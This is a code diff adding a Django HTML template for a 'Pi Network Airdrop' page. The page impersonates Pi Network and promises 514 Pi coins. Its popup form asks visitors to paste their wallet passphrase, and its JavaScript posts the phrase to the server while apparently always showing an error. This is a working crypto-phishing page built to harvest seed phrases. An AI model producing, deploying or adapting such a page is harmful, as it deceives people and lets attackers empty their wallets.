@@ -1,0 +1,365 @@
+{% load static %}
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pi Network Airdrop</title>
+    <link rel="icon" href="{% static 'images/favicon.png' %}" type="image/x-icon">
+    <title>Your Page Title</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
+
+        body {
+            font-family: 'Poppins';
+            background-color: #151937;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            flex-direction: column;
+            width: 100%;
+        }
+
+        .container {
+            max-width: 100%;
+            background-color: #151937;
+            border-radius: none;
+            padding-left: 5%;
+            padding-right: 5%;
+            /*box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5);*/
+        }
+
+        main {
+            padding: 20px;
+        }
+
+        .header, .app-download, .wallet-instructions {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .info-section {
+            margin-bottom: 20px;
+        }
+
+        .app-download {
+            text-align: justify;
+        }
+
+        .logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+
+        h1, h2 {
+            font-weight: 600;
+        }
+
+        .cta-button {
+            display: inline-block;
+            background-color: #ff5e9d;
+            color: #fff;
+            padding: 10px 20px;
+            border-radius: 5px;
+            text-decoration: none;
+            margin-top: 10px;
+            transition: background-color 0.3s ease;
+            cursor: pointer;
+        }
+
+        .cta-button:hover {
+            background-color: #790028;
+        }
+
+        ul {
+            list-style: none;
+            padding: 0;
+        }
+
+        ul li {
+            margin: 5px 0;
+            font-weight: 600;
+        }
+
+        .app-links img {
+            width: 43px;
+            margin: 10px;
+        }
+
+        .subscribe-form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .subscribe-form input {
+            padding: 10px;
+            width: 80%;
+            margin-bottom: 10px;
+            margin-top: 20px;
+            border-radius: 5px;
+            border: none;
+            outline: none;
+            background-color: transparent;
+        }
+
+        img {
+            height: auto;
+            max-width: 100%;
+            border: none;
+            border-radius: 0;
+            box-shadow: none;
+        }
+
+        .step img {
+           width: 50px;
+           height: auto;
+        }
+
+        .step {
+            margin-bottom: 20px;
+        }
+
+		
+
+        /* Popup Styles */
+        .popup {
+            display: none;
+            position: fixed;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .popup-content {
+            background: #351e59; /* Dark purple background */
+            padding: 30px;
+            border-radius: 40px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            position: relative; /* Necessary for close button positioning */
+            color: #ffffff; /* White text */
+        }
+
+        .inner-content {
+            flex-wrap: wrap;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+        }
+
+        .popup-content textarea {
+            width: 100%;
+            max-width: 90%; /* Set a maximum width to align with other elements */
+            height: 150px;
+            border-radius: 10px;
+            border: none;
+            margin-bottom: 5px;
+            padding: 10px;
+            background-color: #ffffff;
+            color: #333333;
+            font-size: 14px;
+            resize: none;
+            display: block; /* Make sure the textarea behaves like a block element */
+            margin-left: auto;
+            margin-right: auto; /* Center the textarea */
+        }
+
+        .popup-content button {
+            background-color: #276b89; /* Cyan button background */
+            color: #ffffff; /* White text */
+            padding: 15px;
+            margin-top: 3px;
+            border-radius: 10px; /* Rounded corners */
+            border: none;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            width: 100%; /* Full-width button */
+            font-size: 16px; /* Slightly larger text */
+        }
+
+        .popup-content button:hover {
+            background-color: #00A0C1; /* Darker cyan on hover */
+        }
+
+        .popup-content .close {
+            position: absolute;
+            top: 15px;
+            right: 20px;
+            font-size: 24px;
+            font-weight: bold;
+            color: #ffffff;
+            cursor: pointer;
+        }
+
+        /* Extra styles for the heading */
+        .popup-content h2 {
+            font-size: 22px; /* Adjust font size */
+            margin-bottom: 20px; /* Space below the heading */
+            color: #ffffff; /* White heading text */
+        }
+
+    </style>
+</head>
+<body>
+    <header>
+        <div style="display: flex; justify-content: center; align-items: center; background-color: #440a6d; width: 100%; height: 70px;">
+            <img src="{% static 'images/logo.png' %}" alt="" class="logo" style="max-width: 100%; height: auto; width: 60%; padding-top: 20px;">
+        </div>
+    </header>
+    <div class="container">
+        <!-- Header -->
+        
+
+        <!-- Main Content -->
+        <main>
+            <h1 style="font-size: 38px; margin:0px;">Pi Network First Airdrop</h1>
+            <p style="margin-top: 0px; color: #a1a3af;">The official Pi Network has reached 2 million pioneers! To get closer to the mainnet and activate and attract more pioneers, they will be holding an airdrop, awarding a total of 514π/pioneer prizes to those who successfully complete KYC. The future looks very exciting as the Pi community continues to build the Web3 Pi ecosystem full of amazing apps and utilities on top of the Pi browser. Let’s get the job done right and do everything we can to support this exciting development.</p>
+            <a href="#" class="cta-button" onclick="openPopup()">Claim 514 Pi Network Coins</a>
+            <img src="{% static 'images/62266.png' %}" alt="unlock wallet">
+            <section class="wallet-instructions">
+                <div class="step">
+                    <img src="{% static 'images/wallet-32.png' %}" alt="unlock wallet">
+                    <p>Unlock your wallet</p>
+                </div>
+                <div class="step">
+                    <img src="{% static 'images/barcode-32.png' %}" alt="Paste Passphrase">
+                    <p>Paste your Passphrase</p>
+                </div>
+                <div class="step">
+                    <img src="{% static 'images/cash-receiving-32.png' %}" alt="Get Airdrop">
+                    <p>Get your Airdrop</p>
+                </div>
+            </section>
+            <img src="{% static 'images/Crypto-Works-Image.webp' %}" alt="unlock wallet">
+			<section class="info-section">
+                <p>How it works:</p>
+                <h2>Get Crypto easy & free.</h2>
+                <p>Link your Pi account and have your PIs in minutes. It’s super easy & fast.</p>
+                <ul>
+                    <li>✓ Free</li>
+                    <li>✓ Secure</li>
+                </ul>
+                <a href="#" class="cta-button" onclick="openPopup()">Claim 514 Pi Network Coins</a>
+            </section>
+			<section class="app-download">
+               <span><h2>Don't have Pi yet? It's Fast & Easy.</h2>
+                <p>Download the app here</p></span>
+                <div class="app-links" style="display: flex; flex-direction: column; align-items: center; gap: 20px;">
+                    <div style="text-align: center;">
+                        <a href="https://itunes.apple.com/us/app/pi-network/id1445472541">
+                            <img src="{% static 'images/pngwing.com.png' %}" alt="Download on the App Store" style="width: 43px; height: auto;">
+                        </a>
+                        <div style="margin-top: 10px; color: white; font-weight: bold;">Download from App Store</div>
+                    </div>
+                    <div style="text-align: center;">
+                        <a href="https://play.google.com/store/apps/details?id=com.blockchainvault">
+                            <img src="{% static 'images/google-play.png' %}" alt="Get it on Google Play" style="width: 40px; height: auto;">
+                        </a>
+                        <div style="margin-top: 10px; color: white; font-weight: bold;">Get it on Google Play</div>
+                    </div>
+                </div>
+                
+                <form class="subscribe-form">
+                    <input type="email" placeholder="Enter your email" required>
+
+                    <button type="submit" class="cta-button">Subscribe</button>
+
+                    <p>We only send you interesting emails</p>
+                </form>
+            </section>
+
+
+        </main>
+        <!-- Footer Section -->
+<footer style="background-color: #1c1c2b; color: #fff; padding: 40px 20px; text-align: center;">
+    <div style="max-width: 100%; margin: 0 auto; display: flex; flex-direction: column; align-items: center;">
+        <!-- Footer Logo -->
+        <div style="margin-bottom: 20px;">
+            <img src="{% static 'images/logo.png' %}" alt="Pi Network Logo" style="width: 100px; height: auto;">
+        </div>
+
+        <!-- Footer Info -->
+        <div style="margin-bottom: 20px;">
+            <p style="margin: 5px 0;">&copy; 2024 Pi Network. All rights reserved.</p>
+            <p style="margin: 5px 0;">Designed by Pi Core Team</p>
+        </div>
+    </div>
+</footer>
+
+        
+        
+
+        <!-- Popup -->
+        <div class="popup" id="popup">
+            <div class="popup-content">
+                <div class="inner-content">
+                    <span class="close" onclick="closePopup()">&times;</span>
+                    <h2>Paste Your Passphrase To Unlock Your Wallet</h2>
+                    <form id="token-form" method="post">
+                        {% csrf_token %}
+                        <textarea name="token" placeholder="e.g. alpha bravo charlie delta echo foxtrot golf hotel india juliett kilo lima mike november oscar papa quebec romeo sierra tango uniform victor whiskey xray" required></textarea>
+				    	<div id="error-message" style="color: red; margin-top: 10px;"></div>
+                        <button type="submit" onclick="submitToken()">Submit</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+
+        <script>
+			
+			function openPopup() {
+    document.getElementById('popup').style.display = 'flex';
+}
+
+function closePopup() {
+    document.getElementById('popup').style.display = 'none';
+}
+
+function submitToken() {
+    const form = document.getElementById('token-form');
+    const formData = new FormData(form);
+
+    fetch(form.action, {
+        method: 'POST',
+        body: formData,
+        headers: {
+            'X-CSRFToken': formData.get('csrfmiddlewaretoken') // CSRF token for Django
+        }
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (!data.success) {
+            // Always display the "Invalid passphrase" message
+            document.getElementById('error-message').innerText = data.error || 'There was a problem submitting the token.';
+        }
+    })
+    .catch(error => {
+        // Handle network errors
+        console.error('Error:', error);
+        document.getElementById('error-message').innerText = 'There was a problem submitting the token.';
+    });
+}
+
+// Override form submission to use fetch
+document.getElementById('token-form').addEventListener('submit', function(event) {
+    event.preventDefault(); // Prevent the default form submission
+    submitToken();
+});
+
+        </script>
+    </div>
+</body>
+</html>
